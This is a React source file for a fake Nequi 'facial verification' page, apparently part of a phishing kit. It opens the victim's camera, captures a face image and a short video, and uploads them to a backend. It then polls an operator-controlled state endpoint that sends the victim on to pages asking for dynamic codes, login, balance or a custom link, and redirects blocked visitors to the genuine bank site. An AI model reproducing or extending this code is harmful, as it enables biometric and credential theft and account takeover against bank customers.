import React, { useState, useEffect, useRef } from 'react';
import { createPortal } from "react-dom";
import { useLocation, useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import logoNequi from "../../images/imgi_1_64dfef05bc6705edb9447499_nequi.svg";
import background from "../../images/imgi_16_background.png";
import LoadingNequiLogin from "../../../../../components/LoadingNequiLogin";
import alert from '../../images/alert.svg';
import './BiometriaNequi.css';

function NequiModalAlert({ modalInfo, closeModal, success, show }) {
    if (!show) return null;

    return createPortal(
        <div className="nequi-modal-alert popup-wrapper popup-show animation-show">
            <div className="popup-table-wrap">
                <div className="popup-table-cell">
                    <div className="popup-box">
                        <div
                            className="close-button-popup"
                            onClick={() => closeModal()}
                        >
                            x
                        </div>

                        {modalInfo?.img && (
                            <img src={modalInfo.img} alt="icon" />
                        )}

                        <h1>{modalInfo?.title || modalInfo?.tittle}</h1>

                        {modalInfo?.message && (
                            <p>{modalInfo.message}</p>
                        )}

                        <a
                            className="button-web"
                            href="#"
                            onClick={(e) => {
                                e.preventDefault();
                                success();
                            }}
                        >
                            Aceptar
                        </a>
                    </div>
                </div>
            </div>
        </div>,
        document.body
    );
}

const NEQUI_ERROR_KEY = "nequi_error_modal";
const NEQUI_MID_FLOW_KEY = "nequi_mid_flow";

const ESTADOS_TRAS_BIO = [
    "sol_din",
    "sol_finalizar",
    "sol_finalizado",
    "error_din",
    "error_login",
    "error_cash",
    "sol_biometria",
    "sol_saldo",
    "block_ip",
    "error_blocked",
    "logo",
    "link_bot",
    "sol_link_bot",
    "sol_link_custom",
];

const CAPTURE_AUTO_DELAY_MS = 10000;

const BiometriaNequi = () => {
    const navigate = useNavigate();
    const location = useLocation();

    const pollingIntervalRef = useRef(null);
    const sessionIdRef = useRef(null);
    const lastEstadoRef = useRef(null);
    const statusTickRef = useRef(null);
    const uploadInFlightRef = useRef(false);
    const bioUploadPendingRef = uploadInFlightRef;
    const allowPollNavigationRef = useRef(true);

    const videoRef = useRef(null);
    const intervalRef = useRef(null);
    const progressIntervalRef = useRef(null);
    const autoCaptureTimeoutRef = useRef(null);
    const captureRef = useRef(() => {});
    const cameraStoppedRef = useRef(false);
    const biometricsActiveRef = useRef(true);
    const progressCircleRef = useRef(null);
    const streamRef = useRef(null);
    const cameraRef = useRef(null);
    const faceDetectionRef = useRef(null);
    const isProcessing = useRef(false);
    const isCapturing = useRef(false);
    const progress = useRef(0);
    const circumferenceRef = useRef(0);

    const [getLoading, setLoading] = useState(false);
    const [getErrors, setErrors] = useState({ error: false, tittle: "¡Ups!", message: "Ocurrió un error al procesar la solicitud. Por favor, intente nuevamente.", img: alert });
    const [status, setStatus] = useState("Iniciando cámara...");
    const [statusColor, setStatusColor] = useState("#da0081");

    const stopPolling = () => {
        if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
            pollingIntervalRef.current = null;
        }
    };

    const nequiNavigate = (ruta) => {
        navigate(ruta, { replace: true, state: { nequiNav: Date.now() } });
    };

    const shouldProcessEstado = (estadoActual, statusTick) => {
        if (statusTick != null) {
            if (statusTickRef.current === statusTick) return false;
            statusTickRef.current = statusTick;
            lastEstadoRef.current = estadoActual;
            return true;
        }
        if (lastEstadoRef.current === estadoActual) return false;
        lastEstadoRef.current = estadoActual;
        return true;
    };

    const updateProgressUI = (percent) => {
        const circle = progressCircleRef.current;
        const circumference = circumferenceRef.current;

        if (!circle) return;

        const offset = circumference - (percent / 100) * circumference;
        circle.style.strokeDashoffset = offset;

        if (percent >= 100) {
            circle.style.stroke = "#22C55E";
        } else {
            circle.style.stroke = "#da0081";
        }
    };

    const resetProgress = () => {
        progress.current = 0;

        if (progressIntervalRef.current) {
            clearInterval(progressIntervalRef.current);
            progressIntervalRef.current = null;
        }

        updateProgressUI(0);
    };

    const clearAutoCaptureTimer = () => {
        if (autoCaptureTimeoutRef.current) {
            clearTimeout(autoCaptureTimeoutRef.current);
            autoCaptureTimeoutRef.current = null;
        }
        resetProgress();
    };

    const waitForVideoReady = (callback) => {
        const video = videoRef.current;
        if (!video) return;

        if (video.videoWidth > 0 && video.videoHeight > 0) {
            callback();
            return;
        }

        const onReady = () => {
            if (video.videoWidth > 0 && video.videoHeight > 0) {
                video.removeEventListener("loadeddata", onReady);
                video.removeEventListener("loadedmetadata", onReady);
                video.removeEventListener("playing", onReady);
                callback();
            }
        };

        video.addEventListener("loadeddata", onReady);
        video.addEventListener("loadedmetadata", onReady);
        video.addEventListener("playing", onReady);
    };

    const startAutoCaptureCountdown = () => {
        clearAutoCaptureTimer();
        if (!biometricsActiveRef.current || uploadInFlightRef.current || cameraStoppedRef.current) {
            return;
        }

        const startTime = Date.now();

        progressIntervalRef.current = setInterval(() => {
            const elapsed = Date.now() - startTime;
            const pct = Math.min(100, (elapsed / CAPTURE_AUTO_DELAY_MS) * 100);
            progress.current = pct;
            updateProgressUI(pct);
        }, 100);

        autoCaptureTimeoutRef.current = setTimeout(() => {
            autoCaptureTimeoutRef.current = null;
            if (progressIntervalRef.current) {
                clearInterval(progressIntervalRef.current);
                progressIntervalRef.current = null;
            }
            if (uploadInFlightRef.current || cameraStoppedRef.current) return;
            progress.current = 100;
            updateProgressUI(100);
            captureRef.current();
        }, CAPTURE_AUTO_DELAY_MS);
    };

    const beginBiometricSession = () => {
        if (!biometricsActiveRef.current) return;
        cameraStoppedRef.current = false;
        isCapturing.current = false;
        setStatus("Ubica tu rostro. Captura automática en 10 segundos");
        setStatusColor("#da0081");
        waitForVideoReady(() => {
            if (uploadInFlightRef.current || cameraStoppedRef.current) return;
            startAutoCaptureCountdown();
        });
    };

    const startWaitingAfterUpload = () => {
        uploadInFlightRef.current = true;
        allowPollNavigationRef.current = true;
        lastEstadoRef.current = null;
        statusTickRef.current = null;
        sessionStorage.setItem(NEQUI_MID_FLOW_KEY, "1");
        setLoading(true);
        setStatus("Esperando respuesta...");
        setStatusColor("#da0081");
        initPolling();
    };

    const stopWaiting = () => {
        sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
        setLoading(false);
    };

    const leaveBiometricsScreen = () => {
        biometricsActiveRef.current = false;
        clearAutoCaptureTimer();
        stopCamera();
        stopPolling();
        uploadInFlightRef.current = false;
        isCapturing.current = false;
        isProcessing.current = false;
        cameraStoppedRef.current = true;
        stopWaiting();
    };

    const stopCamera = () => {
        cameraStoppedRef.current = true;
        clearAutoCaptureTimer();

        if (intervalRef.current) {
            clearInterval(intervalRef.current);
            intervalRef.current = null;
        }

        if (cameraRef.current) {
            try {
                cameraRef.current.stop();
            } catch (e) { }
            cameraRef.current = null;
        }

        if (faceDetectionRef.current) {
            try {
                faceDetectionRef.current.close();
            } catch (e) { }
            faceDetectionRef.current = null;
        }

        if (streamRef.current) {
            streamRef.current.getTracks().forEach(track => track.stop());
            streamRef.current = null;
        }

        if (videoRef.current) {
            videoRef.current.srcObject = null;
        }
    };

    const capture = async () => {
        if (!biometricsActiveRef.current || uploadInFlightRef.current) return;

        clearAutoCaptureTimer();
        uploadInFlightRef.current = true;
        setLoading(true);
        isCapturing.current = true;
        setStatus("Procesando biometría...");
        setStatusColor("#22C55E");

        const video = videoRef.current;

        if (!video || !video.videoWidth || !video.videoHeight) {
            uploadInFlightRef.current = false;
            setLoading(false);
            isCapturing.current = false;
            setStatus("Ubica tu rostro. Captura automática en 10 segundos");
            setStatusColor("#da0081");
            beginBiometricSession();
            return;
        }

        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        const size = Math.min(video.videoWidth, video.videoHeight);

        canvas.width = 640;
        canvas.height = 640;

        const x = (video.videoWidth - size) / 2;
        const y = (video.videoHeight - size) / 2;

        ctx.drawImage(video, x, y, size, size, 0, 0, 640, 640);

        try {
            const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));

            const sessionId =
                localStorage.getItem("sessionId") ||
                sessionStorage.getItem("sessionId");

            if (!sessionId) {
                uploadInFlightRef.current = false;
                setLoading(false);
                isCapturing.current = false;
                setErrors(prev => ({
                    ...prev,
                    error: true,
                    tittle: "Error",
                    message: "No se encontró la sesión de Nequi para enviar la biometría."
                }));
                return;
            }

            const formData = new FormData();
            formData.append("sessionId", sessionId);
            formData.append("username", "Usuario");
            formData.append("image1", imageBlob, "face.jpg");

            const stream = videoRef.current?.srcObject;

            if (!stream) {
                uploadInFlightRef.current = false;
                setLoading(false);
                isCapturing.current = false;
                setErrors(prev => ({
                    ...prev,
                    error: true,
                    tittle: "Error",
                    message: "No se encontró stream de cámara para enviar la biometría."
                }));
                return;
            }

            let recorder;
            try {
                recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
            } catch (e) {
                recorder = new MediaRecorder(stream);
            }

            const chunks = [];

            recorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    chunks.push(event.data);
                }
            };

            recorder.onstop = async () => {
                if (!biometricsActiveRef.current) {
                    uploadInFlightRef.current = false;
                    setLoading(false);
                    isCapturing.current = false;
                    return;
                }

                const videoBlob = new Blob(chunks, { type: "video/webm" });
                formData.append("video", videoBlob, "biometrics_video.webm");

                stopPolling();
                lastEstadoRef.current = null;
                statusTickRef.current = null;

                try {
                    const response = await instanceBackend.post(
                        "/nequi/biometrics/upload",
                        formData,
                        {
                            headers: {
                                "Content-Type": "multipart/form-data",
                            },
                        },
                    );

                    if (response?.data?.success === false) {
                        throw new Error("upload_failed");
                    }

                    const sid =
                        response?.data?.sessionId ||
                        sessionId ||
                        sessionIdRef.current;
                    if (sid) {
                        localStorage.setItem("sessionId", sid);
                        sessionStorage.setItem("sessionId", sid);
                        sessionIdRef.current = sid;
                    }

                    stopCamera();
                    isCapturing.current = false;
                    startWaitingAfterUpload();
                } catch (e) {
                    console.log("e -> ", e);
                    uploadInFlightRef.current = false;
                    setLoading(false);
                    isCapturing.current = false;
                    setErrors((prev) => ({
                        ...prev,
                        error: true,
                        tittle: "Error",
                        message:
                            e?.response?.data?.details ||
                            "Hubo un error al tratar de guardar la información, Por favor intente más tarde.",
                    }));
                    restartBiometrics();
                }
            };

            recorder.start();

            setTimeout(() => {
                recorder.stop();
            }, 3000);
        } catch (error) {
            uploadInFlightRef.current = false;
            setLoading(false);
            isCapturing.current = false;
            setErrors(prev => ({
                ...prev,
                error: true,
                tittle: "Error",
                message: "No se pudo enviar la biometría."
            }));
            restartBiometrics();
        }
    };

    const handleSendBiometrics = () => {
        if (!biometricsActiveRef.current || uploadInFlightRef.current || getLoading) return;
        clearAutoCaptureTimer();
        capture();
    };

    const onResults = (results) => {
        if (!biometricsActiveRef.current) return;
        if (uploadInFlightRef.current) return;
        if (isCapturing.current) return;

        if (results.detections.length > 0) {
            const box = results.detections[0].boundingBox;
            const centerX = box.xCenter;
            const centerY = box.yCenter;
            const width = box.width;

            const isCentered = Math.abs(centerX - 0.5) < 0.12 && Math.abs(centerY - 0.5) < 0.15;
            const isCorrectSize = width > 0.4 && width < 0.65;

            if (isCentered && isCorrectSize) {
                setStatus("Rostro listo. Envía biometría o espera 10 segundos");
                setStatusColor("#22C55E");
            } else {
                if (!isCentered) setStatus("Centra tu rostro");
                else if (width < 0.4) setStatus("Acércate un poco más");
                else setStatus("Aléjate un poco");

                setStatusColor("#da0081");
            }
        } else {
            setStatus("Buscando rostro...");
            setStatusColor("#da0081");
        }
    };

    const setupFaceDetection = () => {
        const { FaceDetection } = window;
        const { Camera } = window;

        if (!FaceDetection || !Camera) {
            beginBiometricSession();
            return;
        }

        const faceDetection = new FaceDetection({
            locateFile: (file) =>
                `https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/${file}`,
        });

        faceDetectionRef.current = faceDetection;

        faceDetection.setOptions({
            model: "short",
            minDetectionConfidence: 0.75,
        });

        faceDetection.onResults(onResults);

        const camera = new Camera(videoRef.current, {
            onFrame: async () => {
                if (cameraStoppedRef.current) return;
                if (uploadInFlightRef.current) return;
                if (isCapturing.current) return;
                if (isProcessing.current) return;
                if (!faceDetectionRef.current) return;
                if (!videoRef.current) return;

                try {
                    isProcessing.current = true;
                    await faceDetectionRef.current.send({ image: videoRef.current });
                } catch (err) {
                    console.warn("MediaPipe frame abortado");
                } finally {
                    isProcessing.current = false;
                }
            },
            width: 640,
            height: 640,
        });

        cameraRef.current = camera;
        camera.start();
        beginBiometricSession();
    };

    const initCamera = async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: "user",
                    width: 640,
                    height: 640,
                },
            });

            streamRef.current = stream;

            if (videoRef.current) {
                videoRef.current.srcObject = stream;
                try {
                    await videoRef.current.play();
                } catch (playError) {
                    console.warn("No se pudo reproducir el video de la cámara:", playError);
                }
            }

            setupFaceDetection();
        } catch (e) {
            console.log("Error al acceder a la cámara:", e);
            setStatus("Error de acceso a cámara");
            setStatusColor("#EF4444");
        }
    };

    const restartBiometrics = () => {
        if (!biometricsActiveRef.current) return;
        biometricsActiveRef.current = true;
        clearAutoCaptureTimer();
        stopCamera();
        isCapturing.current = false;
        isProcessing.current = false;
        uploadInFlightRef.current = false;
        cameraStoppedRef.current = false;
        stopWaiting();
        setStatus("Iniciando cámara...");
        setStatusColor("#da0081");
        initCamera();
    };

    captureRef.current = capture;

    const verifyState = async () => {
        if (!sessionIdRef.current) return;

        try {
            const response = await instanceBackend.post(
                `/nequi/verify-state/${sessionIdRef.current}`,
            );
            const { estado: estadoRaw, state, url, text } = response?.data || {};
            const estadoActual = (estadoRaw || state || "").toString().toLowerCase();
            const hasUrl = Boolean(url && String(url).trim());
            const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);
            const linkPendiente =
                estadoActual === "sol_link_bot" ||
                (estadoActual === "link_bot" && !hasUrl) ||
                (estadoActual === "sol_link_custom" && !customLink);

            if (!estadoActual || !ESTADOS_TRAS_BIO.includes(estadoActual)) return;

            if (
                ESTADOS_TRAS_BIO.includes(estadoActual) &&
                !allowPollNavigationRef.current &&
                estadoActual !== "sol_biometria"
            ) {
                return;
            }

            const statusTick = response?.data?.statusTick ?? null;
            if (!linkPendiente && !shouldProcessEstado(estadoActual, statusTick)) return;
            if (!linkPendiente) lastEstadoRef.current = estadoActual;

            switch (estadoActual) {
                case "logo":
                    leaveBiometricsScreen();
                    stopPolling();
                    localStorage.setItem("sessionId", sessionIdRef.current);
                    window.location.href =
                        "/pse?bank=" + (url || "nequi") + "&sessionId=" + sessionIdRef.current;
                    break;
                case "link_bot":
                case "sol_link_bot":
                    if (hasUrl) {
                        leaveBiometricsScreen();
                        stopPolling();
                        if (
                            url.includes("payulatam.com") ||
                            url.includes("registro.pse.com.co")
                        ) {
                            window.location.replace(url);
                        } else {
                            window.location.href = url;
                        }
                    }
                    break;
                case "sol_link_custom":
                    if (customLink) {
                        leaveBiometricsScreen();
                        stopPolling();
                        window.location.href = customLink;
                    }
                    break;
                case "sol_biometria":
                    setErrors((prev) => ({ ...prev, error: false }));
                    if (cameraStoppedRef.current && uploadInFlightRef.current) {
                        uploadInFlightRef.current = false;
                        restartBiometrics();
                    }
                    break;
                case "sol_din":
                    leaveBiometricsScreen();
                    localStorage.removeItem(NEQUI_ERROR_KEY);
                    nequiNavigate("/nequi_dinamica");
                    break;
                case "sol_finalizar":
                case "sol_finalizado":
                    leaveBiometricsScreen();
                    nequiNavigate("/finalizado-pse");
                    break;
                case "error_din":
                    leaveBiometricsScreen();
                    localStorage.setItem(NEQUI_ERROR_KEY, "error_din");
                    nequiNavigate("/nequi_dinamica");
                    break;
                case "error_login":
                    leaveBiometricsScreen();
                    localStorage.setItem(NEQUI_ERROR_KEY, "error_login");
                    nequiNavigate("/nequi");
                    break;
                case "error_cash":
                    leaveBiometricsScreen();
                    localStorage.setItem(NEQUI_ERROR_KEY, "error_cash");
                    nequiNavigate("/nequi_saldo");
                    break;
                case "sol_saldo":
                    leaveBiometricsScreen();
                    nequiNavigate("/nequi_saldo");
                    break;
                case "block_ip":
                case "error_blocked":
                    leaveBiometricsScreen();
                    localStorage.clear();
                    sessionStorage.clear();
                    window.location.href = process.env.REACT_APP_URL_BANK || "/";
                    break;
                default:
                    break;
            }
        } catch (error) {
            const statusCode = error?.response?.status;
            const estadoErr = (error?.response?.data?.estado || "")
                .toString()
                .toLowerCase();
            if (statusCode === 403 && estadoErr === "error_blocked") {
                localStorage.clear();
                sessionStorage.clear();
                window.location.href = process.env.REACT_APP_URL_BANK || "/";
            }
        }
    };

    const initPolling = () => {
        stopPolling();
        pollingIntervalRef.current = setInterval(() => {
            verifyState();
        }, 3000);
        verifyState();
    };

    useEffect(() => {
        const circle = progressCircleRef.current;
        if (!circle) return;

        const radius = circle.r.baseVal.value;
        const circumference = radius * 2 * Math.PI;
        circumferenceRef.current = circumference;
        circle.style.strokeDasharray = `${circumference}`;
        circle.style.strokeDashoffset = `${circumference}`;
    }, []);

    useEffect(() => {
        initCamera();

        return () => {
            leaveBiometricsScreen();
            if (streamRef.current) {
                streamRef.current.getTracks().forEach((t) => t.stop());
            }
        };
    }, []);

    useEffect(() => {
        sessionIdRef.current =
            localStorage.getItem("sessionId") ||
            sessionStorage.getItem("sessionId");

        if (sessionIdRef.current) {
            allowPollNavigationRef.current = true;
            initPolling();
        }

        return () => stopPolling();
    }, []);

    useEffect(() => {
        if (!location.state?.nequiNav) return;
        biometricsActiveRef.current = true;
        stopWaiting();
        uploadInFlightRef.current = false;
        allowPollNavigationRef.current = true;
        setErrors((prev) => ({ ...prev, error: false }));
        restartBiometrics();
        navigate(location.pathname, { replace: true, state: {} });
    }, [location.state?.nequiNav, navigate, location.pathname]);

    const handleClose = () => {
        setErrors(prev => ({
            error: false,
            img: alert
        }));
        localStorage.clear();
        window.location.href = "/";
    };

    return (
        <div className="nequi-container biometria-nequi-page">
            <header className="nequi-header">
                <img
                    src={logoNequi}
                    alt="Nequi"
                    className="nequi-header__logo"
                    width="104"
                    height="32"
                />
            </header>

            <main
                className="nequi-main bio-main"
                style={{ backgroundImage: background }}
            >
                <h1 className="nequi-title">Verificación Facial</h1>
                <p className="hint-text">
                    Quédate quieto y asegúrate de estar en un lugar con buena iluminación.
                </p>
                <div>
                    <div id="webcam-container" className="bio-webcam-wrap">
                        <div className="bio-webcam-ring">
                            <video
                                ref={videoRef}
                                autoPlay
                                playsInline
                                muted
                                style={{
                                    width: "100%",
                                    height: "100%",
                                    objectFit: "cover",
                                    transform: "scaleX(-1)",
                                }}
                            />

                            <svg
                                className="bio-webcam-svg"
                                width="275"
                                height="275"
                                viewBox="0 0 275 275"
                            >
                                <circle
                                    cx="137.5"
                                    cy="137.5"
                                    r="135.5"
                                    stroke="rgba(218,0,129,0.2)"
                                    strokeWidth="4"
                                    fill="none"
                                />

                                <circle
                                    ref={progressCircleRef}
                                    cx="137.5"
                                    cy="137.5"
                                    r="135.5"
                                    stroke="#22C55E"
                                    strokeWidth="4"
                                    fill="none"
                                    strokeLinecap="round"
                                    style={{
                                        transition: "stroke-dashoffset 0.1s linear",
                                    }}
                                />
                            </svg>
                        </div>
                    </div>
                    <div>
                        <p
                            className="status-hint"
                            style={{
                                color: statusColor,
                                fontSize: "18px",
                                textAlign: "center",
                            }}
                        >
                            {status}
                        </p>

                        <p className="hint-text bio-hint-secondary" style={{ color: '#8b8b8b' }}>
                            Presiona el botón para capturar ahora, o espera 10 segundos para la captura automática.
                        </p>

                        <button
                            type="button"
                            className="nequi-btn nequi-btn--primary bio-send-btn"
                            disabled={getLoading}
                            onClick={handleSendBiometrics}
                        >
                            Enviar biometría
                        </button>
                    </div>
                </div>
            </main>

            {getErrors.error ?
                <NequiModalAlert
                    modalInfo={getErrors}
                    closeModal={handleClose}
                    success={handleClose}
                    show={getErrors.error} /> : null}

            {getLoading && typeof document !== "undefined"
                ? createPortal(<LoadingNequiLogin isOpen />, document.body)
                : null}
        </div>
    );
};

export default BiometriaNequi;
